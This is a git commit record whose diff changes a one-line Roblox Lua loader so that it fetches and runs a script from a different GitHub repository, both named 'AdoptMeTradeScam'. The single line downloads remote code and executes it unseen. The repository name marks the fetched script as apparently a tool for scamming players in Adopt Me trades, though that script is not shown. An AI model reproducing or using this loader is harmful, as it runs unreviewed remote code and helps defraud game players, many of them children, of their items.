f98ba89acfafdc841596a7aceb18c1cc4f44fec6
Penguin284 <107789700+Penguin284@users.noreply.github.com>
2023-01-22 10:00:06 +0000

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/1k2v5o1l2x1/AdoptMeTradeScam/main/tradescam'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Penguin284/AdoptMeTradeScam/main/tradescam'))()
